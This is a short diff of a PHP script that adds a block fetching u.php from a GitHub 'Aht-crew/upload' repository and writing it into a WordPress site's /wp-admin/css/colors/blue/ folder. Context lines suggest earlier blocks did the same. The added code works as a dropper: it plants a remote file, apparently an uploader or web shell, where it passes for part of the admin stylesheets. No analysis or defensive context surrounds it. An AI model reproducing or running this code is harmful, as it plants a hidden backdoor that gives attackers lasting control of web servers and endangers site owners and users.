@@ -39,5 +39,15 @@ if(file_exists($check3)){
   echo "not exits3";
 echo "done3 .\n " ;
  
+$check4 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/blue/u.php" ;
+$text4 = http_get('https://raw.githubusercontent.com/Aht-crew/upload/master/u.php');
+$open4 = fopen($check4, 'w');
+fwrite($open4, $text4);
+fclose($open4);
+if(file_exists($check4)){
+    echo $check4."</br>";
+}else
+  echo "not exits";
+echo "done .\n " ;
  
 ?>
